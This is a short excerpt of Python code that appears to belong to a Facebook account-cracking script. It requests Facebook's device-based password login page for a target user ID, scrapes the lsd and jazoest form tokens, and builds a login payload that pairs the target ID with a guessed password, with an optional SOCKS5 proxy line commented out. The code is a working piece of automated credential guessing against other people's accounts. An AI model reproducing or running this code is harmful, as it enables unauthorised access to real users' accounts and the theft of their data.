...
#			proxs= {'http': 'socks5://'+cuukk}
			...
			p = ses.get(f'https://{link_okep}/login/device-based/password/?uid={uiz}&flow=login_no_pin&next=https%3A%2F%2F{link_okep}%2Fv2.4%2Fdialog%2Foauth%3Fclient_id%3D1013557125334052%26scope%3Dpublic_profile%252Cemail%26state%3D2d3f5623a14d48511f8315a6f3ae197e%26redirect_uri%3Dhttps%253A%252F%252Fforum.idws.id%252Fregister%252Ffacebook%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0774bdd1-cfdc-4af4-a082-33eee2fb718e%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fforum.idws.id%2Fregister%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D2d3f5623a14d48511f8315a6f3ae197e%23_%3D_&display=page&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uiz,"next":"https://"+link_okep+"/v2.4/dialog/oauth?client_id=1013557125334052&scope=public_profile%2Cemail&state=2d3f5623a14d48511f8315a6f3ae197e&redirect_uri=https%3A%2F%2Fforum.idws.id%2Fregister%2Ffacebook&ret=login&fbapp_pres=0&logger_id=0774bdd1-cfdc-4af4-a082-33eee2fb718e&tp=unspecified","flow":"login_no_pin","pass":pw,}
